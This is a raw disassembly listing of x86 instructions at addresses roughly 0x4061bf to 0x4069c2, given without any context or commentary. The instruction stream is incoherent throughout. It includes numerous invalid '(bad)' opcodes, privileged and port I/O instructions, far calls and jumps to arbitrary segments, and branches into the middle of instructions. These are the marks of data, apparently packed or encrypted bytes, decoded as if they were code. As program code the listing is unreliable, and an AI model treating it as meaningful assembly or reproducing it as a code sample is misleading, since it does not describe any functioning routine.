  4061bf:	stos   DWORD PTR es:[edi],eax
  4061c0:	inc    ebx
  4061c1:	cmp    dl,dh
  4061c3:	mov    BYTE PTR [ebp-0x10],bl
  4061c6:	sbb    al,0xba
  4061c8:	cmp    bh,BYTE PTR [edx-0x711e5ec5]
  4061ce:	adc    DWORD PTR [ebp+0x24],esp
  4061d1:	cmp    ah,ch
  4061d3:	sub    edi,DWORD PTR [eax]
  4061d5:	out    dx,al
  4061d6:	mov    WORD PTR [ebx-0x1751b800],ds
  4061dc:	xlat   BYTE PTR ds:[ebx]
  4061dd:	mov    ds:0x55c8d1a7,al
  4061e2:	adc    dh,0x79
  4061e5:	cld    
  4061e6:	sub    eax,0xc883a459
  4061eb:	or     ebp,DWORD PTR [eax]
  4061ed:	jne    0x406215
  4061ef:	add    eax,0x583ad8e2
  4061f4:	mov    dh,0x2d
  4061f6:	push   ecx
  4061f7:	and    eax,0xdce27639
  4061fc:	pop    edx
  4061fd:	adc    BYTE PTR [esi],bh
  4061ff:	shr    BYTE PTR [esi+0xa71cefc],1
  406205:	call   0xbd2:0x1d9edd5
  40620c:	mov    al,ds:0xe4313baf
  406211:	aaa    
  406212:	jb     0x40619f
  406214:	iret   
  406215:	xchg   ebp,eax
  406216:	sub    eax,0xe14f167c
  40621b:	dec    eax
  40621c:	aaa    
  40621d:	xchg   esi,eax
  40621e:	mov    WORD PTR ds:0xad64c4fe,es
  406224:	cmp    esp,eax
  406226:	cli    
  406227:	scas   al,BYTE PTR es:[edi]
  406228:	mov    eax,0x24343131
  40622d:	arpl   WORD PTR [ecx],di
  40622f:	into   
  406230:	shl    DWORD PTR [edx-0x7ec9ec7a],cl
  406236:	lds    esi,FWORD PTR [ebp+0x2]
  406239:	(bad)  
  40623a:	or     DWORD PTR [eax-0x249ee30c],edi
  406240:	push   ebp
  406241:	test   al,0xb1
  406243:	outs   dx,DWORD PTR ds:[esi]
  406244:	scas   eax,DWORD PTR es:[edi]
  406245:	jns    0x4061e4
  406247:	cmp    ecx,DWORD PTR [ecx+esi*4-0x6e]
  40624b:	mov    cl,0x4
  40624d:	call   FWORD PTR [esi]
  40624f:	dec    esi
  406250:	sub    cl,cl
  406252:	(bad)  [eax]
  406254:	ins    DWORD PTR es:[edi],dx
  406255:	push   edi
  406256:	fwait
  406257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406258:	lds    ebp,FWORD PTR [edi]
  40625a:	out    0xfb,eax
  40625c:	xchg   ah,ch
  40625e:	or     dl,0x7
  406261:	and    eax,0xe8be4c89
  406266:	enter  0xc510,0xc7
  40626a:	mov    DWORD PTR [edi-0x6ef56bf0],edx
  406270:	inc    eax
  406271:	pop    esp
  406272:	daa    
  406273:	xor    al,0x2c
  406275:	mov    ch,0x1f
  406277:	pop    edx
  406278:	adc    DWORD PTR [eax-0x4a88e460],esi
  40627e:	mov    dh,0xd4
  406280:	daa    
  406281:	cmp    ebx,DWORD PTR [edx-0x78]
  406284:	enter  0xde9,0x4e
  406288:	imul   ecx,DWORD PTR [eax],0x6424f9f4
  40628e:	jnp    0x40621a
  406290:	data16 add al,0xed
  406293:	jge    0x4062b3
  406295:	push   edx
  406296:	ret    0xf526
  406299:	in     al,dx
  40629a:	mov    es,edx
  40629c:	cmp    DWORD PTR [edx],0x368dfc5b
  4062a2:	popf   
  4062a3:	fnsave [ecx-0x3d88e719]
  4062a9:	jnp    0x40629e
  4062ab:	ins    DWORD PTR es:[edi],dx
  4062ac:	fmul   st(4),st
  4062ae:	stos   BYTE PTR es:[edi],al
  4062af:	add    ah,dl
  4062b1:	test   BYTE PTR [eax],cl
  4062b3:	pop    ds
  4062b4:	int    0xff
  4062b6:	add    eax,0x6e7a3b0c
  4062bb:	dec    eax
  4062bc:	pop    esi
  4062bd:	cmp    BYTE PTR [edx+0x54],cl
  4062c0:	iret   
  4062c1:	fst    QWORD PTR [eax-0x75]
  4062c4:	mov    bh,0x4e
  4062c6:	aad    0x14
  4062c8:	and    cl,BYTE PTR [eax+0x59]
  4062cb:	xchg   dx,ax
  4062cd:	das    
  4062ce:	xlat   BYTE PTR ds:[ebx]
  4062cf:	dec    ecx
  4062d0:	jle    0x406327
  4062d2:	dec    eax
  4062d3:	sar    BYTE PTR [ebx+edi*1+0x1935af5f],1
  4062da:	jb     0x406349
  4062dc:	sub    al,0x10
  4062de:	adc    eax,0xc6301b62
  4062e3:	bound  edi,QWORD PTR [ebx+0x4b]
  4062e6:	xchg   ecx,eax
  4062e7:	js     0x4062b1
  4062e9:	mov    ds:0x962ea506,eax
  4062ee:	stos   DWORD PTR es:[edi],eax
  4062ef:	fnstsw WORD PTR [ecx+0x9]
  4062f2:	xor    DWORD PTR [edx+0x69],edx
  4062f5:	dec    esi
  4062f6:	mov    ah,0x46
  4062f8:	frstor [ebp-0x7a]
  4062fb:	mov    cl,0xa0
  4062fd:	test   eax,0x18c51f29
  406302:	mov    bl,0xc0
  406304:	in     al,0x24
  406306:	mov    ds:0xe1a7c7ec,al
  40630b:	loopne 0x40628e
  40630d:	repnz xchg edi,eax
  40630f:	sti    
  406310:	in     al,0xd0
  406312:	pop    ss
  406313:	xchg   edi,eax
  406314:	and    bh,bl
  406316:	cmp    DWORD PTR [ecx+0x3d56a891],edx
  40631c:	out    0x41,al
  40631e:	mov    dh,0x90
  406320:	xchg   edi,eax
  406321:	inc    ecx
  406323:	ss loopne 0x4062d1
  406326:	or     esi,DWORD PTR [edi+ebp*8+0x5d7addd8]
  40632d:	jmp    0x2499b37e
  406332:	push   ds
  406333:	push   ebp
  406334:	xlat   BYTE PTR ds:[ebx]
  406335:	jge    0x406345
  406337:	add    ah,BYTE PTR [edi]
  406339:	out    dx,al
  40633a:	dec    edx
  40633b:	xor    al,BYTE PTR [edi*4-0x36ab36b7]
  406342:	adc    al,0xfe
  406344:	cwde   
  406345:	jmp    0x406355
  406347:	ret    
  406348:	mov    bh,BYTE PTR [eax+0x6b]
  40634b:	fiadd  WORD PTR [ebp-0x7616cb3f]
  406351:	dec    ebx
  406352:	shr    bl,0xa7
  406355:	mov    eax,ds:0xe7b902ec
  40635a:	lds    eax,FWORD PTR [ecx+0x563d674d]
  406360:	sub    DWORD PTR [esp+edx*1-0x11],esi
  406364:	std    
  406365:	or     al,0x3a
  406367:	(bad)  
  406368:	jg     0x406317
  40636a:	mov    BYTE PTR [esi+0x1cfc0f73],ch
  406370:	out    dx,al
  406371:	sub    al,0x16
  406373:	pushf  
  406374:	jecxz  0x40639e
  406376:	out    dx,eax
  406377:	xor    ecx,ebp
  406379:	mov    edx,0x8100f286
  40637e:	jno    0x6b2f974b
  406384:	lods   eax,DWORD PTR ds:[esi]
  406385:	mov    edi,0xe5174bb3
  40638a:	ins    DWORD PTR es:[edi],dx
  40638b:	push   esp
  40638c:	fst    st(3)
  40638e:	not    BYTE PTR [ecx-0x39]
  406391:	lea    eax,[ebx-0x4b]
  406394:	mov    eax,ds:0x3f785e0
  406399:	inc    ebp
  40639a:	mov    BYTE PTR [esi-0x1e],dl
  40639d:	(bad)  
  40639e:	fidivr WORD PTR [esi]
  4063a0:	sar    DWORD PTR [eax],1
  4063a2:	adc    ebp,edx
  4063a4:	mov    DWORD PTR [ebx],ebp
  4063a6:	mov    dh,0xff
  4063a8:	out    0x9d,eax
  4063aa:	jmp    0x3153e4d4
  4063af:	add    esp,DWORD PTR [edi+0x3107036e]
  4063b5:	(bad)  [eax]
  4063b7:	xchg   ebp,eax
  4063b8:	inc    edi
  4063b9:	sub    BYTE PTR [edx],dl
  4063bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063bc:	sub    DWORD PTR [eax],ebx
  4063be:	out    dx,ax
  4063c0:	jne    0x40643b
  4063c2:	(bad)
  4063c6:	mov    edx,0x9bd4f196
  4063cb:	inc    esi
  4063cc:	xchg   DWORD PTR [edi+0x3d2551f5],esp
  4063d2:	inc    ebx
  4063d3:	dec    BYTE PTR [ecx+ebx*1-0x3f7f1737]
  4063da:	mov    edx,0x7fc3d539
  4063df:	jmp    DWORD PTR [eax-0x5a]
  4063e2:	xor    eax,0x1c048898
  4063e7:	in     al,0x4f
  4063e9:	dec    esi
  4063ea:	xor    ebp,DWORD PTR [ecx]
  4063ec:	lock adc bh,BYTE PTR [ebx+0x4f51611e]
  4063f3:	in     al,dx
  4063f4:	or     al,0x1f
  4063f6:	mov    edi,0x42361ea
  4063fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fc:	test   esp,0x6caee8d4
  406402:	mov    esp,0xcee3cd64
  406407:	and    DWORD PTR fs:[eax+0x2fb5aade],ecx
  40640e:	cmp    eax,0xd53355a7
  406413:	and    BYTE PTR [ebx+0x1],ah
  406416:	or     BYTE PTR [ebp+eax*8-0x48],ah
  40641a:	pop    ss
  40641b:	(bad)  
  40641c:	call   DWORD PTR [edi]
  40641e:	push   ss
  40641f:	and    eax,0x229b2cf5
  406424:	mov    BYTE PTR [ebx-0x62],bh
  406427:	add    DWORD PTR [edi],0xbbd443cc
  40642d:	xor    bl,BYTE PTR [ebp+0x71]
  406430:	outs   dx,DWORD PTR ds:[esi]
  406431:	push   0xffffffb0
  406433:	scas   eax,DWORD PTR es:[edi]
  406434:	inc    ecx
  406435:	cmp    BYTE PTR [ebx],dl
  406437:	stc    
  406438:	mov    edi,0xf6adbfc
  40643d:	sub    DWORD PTR [ebp+esi*4-0x435c458c],0xfffffff1
  406445:	cmp    al,0x6d
  406447:	arpl   WORD PTR [ecx-0x1e],cx
  40644a:	jb     0x4064c9
  40644c:	(bad)  
  40644d:	inc    ecx
  40644e:	repnz hlt 
  406450:	push   ebp
  406451:	daa    
  406452:	mov    ds:0x1afa1e78,al
  406457:	sbb    DWORD PTR [edx],ebx
  406459:	fwait
  40645a:	xchg   edi,eax
  40645b:	inc    edi
  40645c:	add    eax,0xd24af8c8
  406461:	scas   eax,DWORD PTR es:[edi]
  406462:	pop    es
  406463:	pop    eax
  406464:	(bad)  
  406465:	pop    edi
  406466:	stc    
  406467:	aaa    
  406468:	sub    DWORD PTR [eax-0x64],0x3a
  40646c:	mov    ch,0x8
  40646e:	dec    esp
  40646f:	retf   0x2ca6
  406472:	push   edi
  406473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406474:	jmp    0x52e2:0x6fa5a0e7
  40647b:	mov    edi,?
  40647d:	lahf   
  40647e:	sub    BYTE PTR [eax+0x12],ah
  406481:	inc    ebp
  406482:	mov    ebx,0x50944e33
  406487:	popf   
  406488:	cli    
  406489:	sbb    edx,DWORD PTR [eax]
  40648b:	jl     0x4064ca
  40648d:	jnp    0x406498
  40648f:	xchg   esp,eax
  406490:	scas   al,BYTE PTR es:[edi]
  406491:	icebp  
  406492:	and    DWORD PTR [esp+edx*8+0x25b0a546],esi
  406499:	lea    ecx,[ebx]
  40649b:	mov    al,0xea
  40649d:	imul   ecx,DWORD PTR [edi+0x183af8ad],0x311bbcd
  4064a7:	cwd    
  4064a9:	outs   dx,BYTE PTR ds:[esi]
  4064aa:	ret    0x17ce
  4064ad:	ror    DWORD PTR [edi+ecx*8-0x1a],cl
  4064b1:	push   edi
  4064b2:	arpl   WORD PTR [esi+ebp*8-0x654cb419],bp
  4064b9:	cdq    
  4064ba:	fdiv   QWORD PTR [edx]
  4064bc:	jb     0x40648e
  4064be:	fmul   QWORD PTR [esi+edx*2+0x1f44918a]
  4064c5:	shl    DWORD PTR [edx-0x498ab863],1
  4064cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064cc:	add    ebx,edx
  4064ce:	inc    ebp
  4064cf:	jb     0x40652a
  4064d1:	stc    
  4064d2:	jae    0x4064f6
  4064d4:	inc    edx
  4064d5:	inc    esi
  4064d6:	and    eax,0x53051830
  4064db:	sbb    esp,DWORD PTR [esi-0x78]
  4064de:	jno    0x40647e
  4064e0:	jno    0x406523
  4064e2:	hlt    
  4064e3:	(bad)
  4064e7:	retf   0x83ea
  4064ea:	test   DWORD PTR [edx+esi*4],ebp
  4064ed:	xor    eax,0x816ffce0
  4064f2:	stos   BYTE PTR es:[edi],al
  4064f3:	inc    edx
  4064f4:	loopne 0x406523
  4064f6:	mov    bh,0x28
  4064f8:	dec    edi
  4064f9:	xchg   DWORD PTR [esi],eax
  4064fb:	mov    esi,ecx
  4064fd:	test   BYTE PTR [edx+0x5b],0xc8
  406501:	sbb    eax,0x2ddc1ec7
  406506:	jnp    0x4064b3
  406508:	mov    eax,0x3df8baaf
  40650d:	call   0x603616f5
  406512:	push   ecx
  406513:	fmul   QWORD PTR [ecx+0xc1136b3]
  406519:	mov    ds:0xcb373ab9,al
  40651e:	push   ss
  40651f:	add    ebx,DWORD PTR [esi+ebp*4+0x7f]
  406523:	out    dx,eax
  406524:	frstor [esi]
  406526:	or     BYTE PTR [esi],ah
  406528:	js     0x40658b
  40652a:	lock outs dx,BYTE PTR ds:[esi]
  40652c:	inc    eax
  40652d:	in     eax,dx
  40652e:	xchg   edx,eax
  40652f:	xchg   edi,eax
  406530:	aad    0x79
  406532:	repz aam 0x6
  406535:	call   0xa3cb:0x8ee64a00
  40653c:	clc    
  40653d:	mov    ecx,0x50a1c17f
  406542:	xchg   DWORD PTR [eax+edx*8],esp
  406545:	jno    0x4065a9
  406547:	pop    ss
  406548:	sub    al,0xc5
  40654a:	push   ecx
  40654b:	hlt    
  40654c:	mul    ebp
  40654e:	jge    0x4064fe
  406550:	mov    dl,bl
  406552:	in     eax,0xb3
  406554:	xor    esi,DWORD PTR [ebp-0x6031510e]
  40655a:	loope  0x406598
  40655c:	out    0x1,al
  40655e:	mov    bh,0x4f
  406560:	mov    BYTE PTR [ebx+esi*4],cl
  406563:	fdivr  st,st(4)
  406565:	mov    BYTE PTR [edx-0x1b23dcf6],ch
  40656b:	xor    BYTE PTR ds:0x2f5e8424,ah
  406571:	neg    edi
  406573:	inc    BYTE PTR [ebp-0x5b62e1ad]
  406579:	dec    esi
  40657a:	aam    0xd3
  40657c:	inc    ebp
  40657d:	fiadd  DWORD PTR [ebx-0x45f04ab8]
  406583:	and    eax,0xb83db320
  406588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406589:	aas    
  40658a:	dec    esi
  40658b:	sub    DWORD PTR [edi+0x59e540bb],0x39
  406592:	test   BYTE PTR [ebx-0x66833973],dl
  406598:	pop    esp
  406599:	xor    esp,0xfffffff2
  40659c:	test   al,0x7e
  40659e:	hlt    
  40659f:	inc    esi
  4065a0:	arpl   WORD PTR [edx+0x3],dx
  4065a3:	push   0x6b0a4b40
  4065a8:	or     BYTE PTR [eax],cl
  4065aa:	jae    0x4065f0
  4065ac:	dec    esi
  4065ad:	test   eax,0x22c3325b
  4065b2:	aaa    
  4065b3:	adc    al,0xd6
  4065b5:	mov    ebx,0x87392b2b
  4065ba:	push   0x48
  4065bc:	jb     0x40657e
  4065be:	inc    ecx
  4065bf:	jno    0x406577
  4065c1:	les    esi,FWORD PTR [edi]
  4065c3:	xchg   edx,eax
  4065c4:	scas   al,BYTE PTR es:[edi]
  4065c5:	(bad)  
  4065c6:	je     0x40657e
  4065c8:	mov    ebx,0x50863f86
  4065cd:	fs pop ebx
  4065cf:	outs   dx,BYTE PTR ds:[esi]
  4065d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d1:	mov    bh,bh
  4065d3:	stc    
  4065d4:	push   edx
  4065d5:	cmp    esi,DWORD PTR [eax+0x73]
  4065d8:	xchg   edi,eax
  4065d9:	neg    DWORD PTR [ebp-0x2d]
  4065dc:	fwait
  4065dd:	mov    esi,0xf1617331
  4065e2:	and    dl,BYTE PTR [edx+0x16]
  4065e5:	in     al,0x98
  4065e7:	pop    edi
  4065e8:	in     eax,dx
  4065e9:	js     0x40663a
  4065eb:	aad    0x75
  4065ed:	les    eax,FWORD PTR [eax+edx*4]
  4065f0:	sbb    edx,esp
  4065f2:	rcr    BYTE PTR [bx+si],cl
  4065f5:	stc    
  4065f6:	cdq    
  4065f7:	rcl    BYTE PTR [ebp-0x32ad57eb],1
  4065fd:	lahf   
  4065fe:	adc    dh,dh
  406600:	lea    eax,[ebx+0x7f]
  406603:	fnstcw WORD PTR [eax-0x6e]
  406606:	mov    bh,BYTE PTR [esi]
  406608:	shl    DWORD PTR es:[edx+0x51f0dbd9],cl
  40660f:	(bad)  
  406610:	retf   0xb231
  406613:	inc    esp
  406614:	jmp    0x3d9cc7b8
  406619:	push   ebp
  40661a:	sbb    edx,DWORD PTR [eax+edi*8]
  40661d:	cmp    DWORD PTR [eax+0x55],esi
  406620:	cmp    ebx,eax
  406622:	mov    ah,0x64
  406624:	stos   DWORD PTR es:[edi],eax
  406625:	repz jmp 0x5bb3591
  40662b:	sar    BYTE PTR [esi+0x15dc55e],1
  406631:	loopne 0x4065de
  406633:	pop    edi
  406634:	pushf  
  406635:	sbb    al,0xc3
  406637:	inc    ebx
  406638:	or     eax,0xa95b6633
  40663d:	(bad)  
  40663f:	call   0x26837ced
  406644:	mov    ebp,0xfa7ebde
  406649:	test   DWORD PTR [edx+0x1c17192f],esp
  40664f:	out    0xaa,al
  406651:	pop    esi
  406652:	in     al,dx
  406653:	ds or  ah,ah
  406656:	(bad)  
  406657:	ficomp DWORD PTR [edi+0x6c4871a0]
  40665d:	out    0x26,al
  40665f:	and    cl,BYTE PTR ds:0xd2a9a85a
  406665:	and    esp,esi
  406667:	sbb    al,0xb6
  406669:	dec    esi
  40666a:	call   FWORD PTR [eax+ecx*1-0x2b536388]
  406671:	push   cs
  406672:	push   0x5e
  406674:	iret   
  406675:	mov    dl,0xc0
  406677:	xchg   edi,eax
  406678:	jns    0x40663a
  40667a:	xlat   BYTE PTR ds:[ebx]
  40667b:	xchg   esp,eax
  40667c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40667e:	(bad)  
  40667f:	mov    ds:0xed406f40,eax
  406684:	int3   
  406685:	mov    BYTE PTR [ecx+0x42b6005e],cl
  40668b:	jb     0x40668a
  40668d:	fcom   QWORD PTR [edi+0x7f82801d]
  406693:	(bad)  
  406694:	fnstcw WORD PTR [eax]
  406696:	push   edx
  406697:	inc    ecx
  406698:	scas   eax,DWORD PTR es:[edi]
  406699:	jmp    0x4870:0x8f902329
  4066a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a1:	(bad)  
  4066a2:	retf   0xa969
  4066a5:	mov    BYTE PTR cs:0xb2cac23f,bl
  4066ac:	loopne 0x40666c
  4066ae:	or     eax,0x1ba8ecd
  4066b3:	inc    edx
  4066b4:	mov    al,0x2e
  4066b6:	push   0x82550ae1
  4066bb:	jp     0x406670
  4066bd:	(bad)
  4066c1:	sub    BYTE PTR [esi-0x1d119851],bl
  4066c7:	cld    
  4066c8:	push   ds
  4066c9:	inc    eax
  4066ca:	pop    ebx
  4066cb:	dec    eax
  4066cc:	jno    0x406715
  4066ce:	lea    ebp,[ebp+ebp*4+0x10]
  4066d2:	or     al,0x4c
  4066d4:	das    
  4066d5:	(bad)  
  4066d6:	ja     0x40674b
  4066d8:	inc    ecx
  4066d9:	call   0xb0ff:0xd6b9107f
  4066e0:	ror    BYTE PTR [ebp+0x67],0x75
  4066e4:	in     eax,dx
  4066e5:	das    
  4066e6:	ins    DWORD PTR es:[edi],dx
  4066e7:	xor    BYTE PTR [esi+0x45ca0655],ch
  4066ed:	in     eax,0x1c
  4066ef:	pop    eax
  4066f0:	mov    cl,0x2
  4066f2:	imul   esi,esi,0xd18e95b3
  4066f8:	mov    dl,0x89
  4066fa:	mov    eax,0xd8dc8f08
  4066ff:	adc    al,0xda
  406701:	out    0xdb,eax
  406703:	cdq    
  406704:	mov    bl,0x77
  406706:	lock mov eax,0x22292d45
  40670c:	and    esp,DWORD PTR [edx]
  40670e:	cwde   
  40670f:	push   ebx
  406710:	sbb    al,0x7c
  406712:	imul   ebp,DWORD PTR [ebx],0x1f2c8db4
  406718:	pusha  
  406719:	adc    ah,BYTE PTR [ebp+0x0]
  40671c:	shl    DWORD PTR [edi-0x10],cl
  40671f:	repnz aam 0x55
  406722:	push   ebp
  406723:	or     al,0x6c
  406725:	in     eax,0x44
  406727:	mov    dh,0x22
  406729:	pop    esi
  40672a:	stc    
  40672b:	ror    dl,0xd0
  40672e:	and    al,0x84
  406730:	pop    edx
  406731:	(bad)  
  406732:	sub    al,0x5b
  406734:	or     eax,DWORD PTR [edx+0x5a9da78a]
  40673a:	xchg   edi,eax
  40673b:	mov    ecx,0x4dc31f28
  406740:	inc    edx
  406741:	pushf  
  406742:	xor    eax,0xd37a7e86
  406747:	lods   al,BYTE PTR ds:[esi]
  406748:	ret    
  406749:	aad    0x9d
  40674b:	data16 xlat BYTE PTR ds:[ebx]
  40674d:	or     ch,BYTE PTR [ebx]
  40674f:	mov    ebp,DWORD PTR [ebp+ecx*2-0x693b3c71]
  406756:	sbb    DWORD PTR [edx+0x71],esp
  406759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40675a:	jno    0x40674b
  40675c:	sub    DWORD PTR [esp+ecx*8-0x43],eax
  406760:	outs   dx,BYTE PTR ds:[esi]
  406761:	hlt    
  406762:	popa   
  406763:	fisttp WORD PTR [edx-0x2d]
  406766:	fwait
  406767:	xchg   edi,eax
  406768:	jb     0x4067a7
  40676a:	in     eax,dx
  40676b:	pop    ss
  40676c:	lea    ebp,[edx]
  40676e:	cmp    edx,ebp
  406770:	sub    eax,0x480d5976
  406775:	fwait
  406776:	sbb    dh,BYTE PTR [ebx]
  406778:	ficom  DWORD PTR [esi+ebp*8-0x5a40e653]
  40677f:	out    0x3f,eax
  406781:	fstp   QWORD PTR [ebp+0x795993c9]
  406787:	or     eax,0xdd676759
  40678c:	xchg   ecx,eax
  40678d:	mov    bl,ah
  40678f:	add    BYTE PTR ss:[ebp+0x4b],ah
  406793:	maxps  xmm5,XMMWORD PTR ds:0x46a8a492
  40679a:	fnsave [edi]
  40679c:	xor    eax,0x2158e4ac
  4067a1:	xchg   ebp,eax
  4067a2:	xor    ecx,DWORD PTR [ebp+ebx*4+0x49]
  4067a6:	push   edx
  4067a7:	rcr    di,cl
  4067aa:	jmp    0x4a1b3ed8
  4067af:	cdq    
  4067b0:	adc    edi,DWORD PTR [ebp-0x18]
  4067b3:	add    ecx,esp
  4067b5:	add    ecx,DWORD PTR [edi]
  4067b7:	push   esp
  4067b8:	pop    ecx
  4067b9:	(bad)  
  4067bb:	ins    BYTE PTR es:[edi],dx
  4067bc:	jns    0x40677d
  4067be:	(bad)  
  4067bf:	sbb    BYTE PTR [edx-0x54],dh
  4067c2:	fwait
  4067c3:	lds    esi,FWORD PTR [eax-0x4fa12fff]
  4067c9:	or     DWORD PTR [edi+0x8],ebp
  4067cc:	xchg   ebx,eax
  4067cd:	repnz gs repz idiv bl
  4067d2:	daa    
  4067d3:	pop    edi
  4067d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067d5:	out    dx,al
  4067d6:	jne    0x406772
  4067d8:	sbb    al,0x5c
  4067da:	lods   eax,DWORD PTR ds:[esi]
  4067db:	ds daa 
  4067dd:	xor    al,0xef
  4067df:	pop    edx
  4067e0:	mov    ebx,0xdd6f68d9
  4067e5:	cmp    al,0xd6
  4067e7:	in     eax,0xbd
  4067e9:	sahf   
  4067ea:	jnp    0x40678d
  4067ec:	mov    ecx,0x3649596e
  4067f1:	shld   DWORD PTR [ebx-0x7aa4d3fb],edx,cl
  4067f8:	loope  0x406812
  4067fa:	adc    eax,0x93e87cd7
  4067ff:	xor    ebx,DWORD PTR [edx+0x9ca6828]
  406805:	xchg   esi,eax
  406806:	pop    edx
  406807:	sbb    esp,ebp
  406809:	pop    edi
  40680a:	in     eax,dx
  40680b:	jp     0x4067bd
  40680d:	sti    
  40680e:	dec    ecx
  40680f:	mov    edx,0xc74e0b17
  406814:	dec    eax
  406815:	in     al,0x55
  406817:	out    dx,eax
  406818:	xchg   DWORD PTR [ecx-0x1e],edx
  40681b:	test   DWORD PTR [eax+eax*8],0x11065282
  406822:	std    
  406823:	xor    al,BYTE PTR [ebx+0x12]
  406826:	sbb    edi,esi
  406828:	or     cl,BYTE PTR [eax+eax*1+0xc]
  40682c:	sbb    DWORD PTR [eax+0xc21d881],0xffffffd0
  406833:	out    0xcc,al
  406835:	sti    
  406836:	ss cs sbb dh,al
  40683a:	mov    dl,dh
  40683c:	addr16 mov dl,0xa7
  40683f:	bound  edi,QWORD PTR [edx+0x5a]
  406842:	xchg   edx,eax
  406843:	push   ebx
  406844:	adc    esp,eax
  406846:	and    BYTE PTR [ebp-0x4f],0x7a
  40684a:	stos   DWORD PTR es:[edi],eax
  40684b:	out    dx,al
  40684c:	push   esp
  40684d:	push   edx
  40684e:	lea    edi,[edi-0xf12dd89]
  406854:	in     al,dx
  406855:	aas    
  406856:	stos   BYTE PTR es:[edi],al
  406857:	xor    BYTE PTR [ebx+0x46],0xcc
  40685b:	jg     0x4068b7
  40685d:	pushf  
  40685e:	inc    esi
  40685f:	nop
  406860:	dec    ebp
  406861:	daa    
  406862:	mov    ch,0x91
  406864:	imul   edi,edx,0xffffffe2
  406867:	pcmpeqd mm4,QWORD PTR [ebp+0xef9a19c]
  40686e:	arpl   cx,dx
  406870:	mov    esi,0x474163a5
  406875:	imul   ecx,DWORD PTR [ecx-0x7a],0x75
  406879:	ret    0xabc3
  40687c:	test   DWORD PTR [ebp-0x4d],0xa4060812
  406883:	ret    
  406884:	adc    al,0x9f
  406886:	mov    edx,0xc4cd19e0
  40688b:	mov    ebp,0x9c378971
  406890:	ret    0x925e
  406893:	xchg   edi,eax
  406894:	aam    0xd6
  406896:	mov    ecx,0xb5a6c00e
  40689b:	and    edx,esp
  40689d:	(bad)  
  40689f:	sbb    esi,DWORD PTR [ebp+edx*8-0x27]
  4068a3:	lods   eax,DWORD PTR ds:[esi]
  4068a4:	gs or  eax,0x4d01c125
  4068aa:	daa    
  4068ab:	dec    edi
  4068ac:	(bad)  
  4068ad:	or     DWORD PTR [edi],edi
  4068af:	sbb    edx,DWORD PTR [edx+0x6a]
  4068b2:	add    ecx,DWORD PTR [esp+edx*8+0x5b2db6af]
  4068b9:	pop    esi
  4068ba:	imul   ecx,DWORD PTR [ecx+edi*2-0x75175e44],0x1e488d4e
  4068c5:	mov    edi,DWORD PTR [edx-0x2c026c91]
  4068cb:	test   al,0x47
  4068cd:	sub    BYTE PTR [ecx+0x69],dl
  4068d0:	pushaw 
  4068d2:	data16 ja 0x4068dc
  4068d5:	sbb    al,0x25
  4068d7:	or     al,0x1e
  4068d9:	arpl   WORD PTR [esi+0x15d7ab0a],sp
  4068df:	push   edx
  4068e0:	mov    ds:0xd905daaa,eax
  4068e5:	push   es
  4068e6:	out    dx,eax
  4068e7:	scas   eax,DWORD PTR es:[edi]
  4068e8:	or     DWORD PTR [esi-0x44],edi
  4068eb:	clc    
  4068ec:	xchg   esi,eax
  4068ed:	loopne 0x40694e
  4068ef:	bound  edi,QWORD PTR [ecx+0x7e46f733]
  4068f5:	jg     0x4068f4
  4068f7:	mov    ah,0x44
  4068f9:	jns    0x406957
  4068fb:	cwde   
  4068fc:	xchg   ecx,eax
  4068fd:	je     0x40691f
  4068ff:	loopne 0x4068d0
  406901:	jecxz  0x4068f8
  406903:	dec    edi
  406904:	or     bl,ch
  406906:	push   ecx
  406907:	adc    dl,BYTE PTR [ebp+0x65dcfb9b]
  40690d:	mov    ah,0xe0
  40690f:	xor    al,0xa5
  406911:	xor    DWORD PTR ds:0x9cbba8b5,ebx
  406917:	adc    DWORD PTR [esp+ebx*2+0x7a462943],ebp
  40691e:	jmp    0xbb7a88b6
  406923:	mov    dh,0xf3
  406925:	mov    esp,0xf0674ec4
  40692a:	icebp  
  40692b:	cwde   
  40692c:	sub    bl,ah
  40692e:	retf   0xbb42
  406931:	mov    eax,0x3502945
  406936:	adc    cl,ch
  406938:	fsub   QWORD PTR [ebp-0x62]
  40693b:	and    bh,BYTE PTR [ebx]
  40693d:	std    
  40693e:	mov    ebx,0xc400ab32
  406943:	repnz and dl,dl
  406946:	stos   DWORD PTR es:[edi],eax
  406947:	sbb    eax,0xe3ce3365
  40694c:	mov    ch,0xf3
  40694e:	mov    ah,0x2a
  406950:	xchg   esi,eax
  406951:	mov    eax,0x644041bd
  406956:	popa   
  406957:	fld    st(6)
  406959:	les    ebx,FWORD PTR [edx+0x7]
  40695c:	jg     0x406974
  40695e:	fwait
  40695f:	adc    BYTE PTR [eax+0x4eaba45c],ch
  406965:	jmp    0xec546ec8
  40696a:	sub    al,0x22
  40696c:	imul   edx,DWORD PTR [esi+0x3],0x37
  406970:	out    dx,al
  406971:	das    
  406972:	jbe    0x4069c3
  406974:	cmc    
  406975:	mov    dh,dl
  406977:	sub    al,0xc1
  406979:	mov    dh,0x4f
  40697b:	sbb    edx,DWORD PTR ds:0x13cb6f93
  406981:	call   0xc1604cf
  406986:	inc    edx
  406987:	adc    eax,0x71
  40698a:	push   esp
  40698b:	xor    al,0x38
  40698d:	dec    esi
  40698e:	cwde   
  40698f:	test   BYTE PTR [edx-0x16a3d355],bl
  406995:	pop    edi
  406996:	add    eax,0xfd5aec9a
  40699b:	jae    0x406926
  40699d:	xchg   esp,eax
  40699e:	xchg   DWORD PTR [ebp+0x36],eax
  4069a1:	pop    ecx
  4069a2:	jmp    0xe491ad2a
  4069a7:	cs aam 0x96
  4069aa:	(bad)  
  4069ab:	mov    ah,0x97
  4069ad:	cs pop ecx
  4069af:	push   esp
  4069b0:	push   es
  4069b1:	test   BYTE PTR [esi+0x61381298],bh
  4069b7:	xchg   esp,eax
  4069b8:	and    eax,0xf5949a26
  4069bd:	xor    eax,0xf114e9f4
  4069c2:	call   0x93a3:0xe317369f
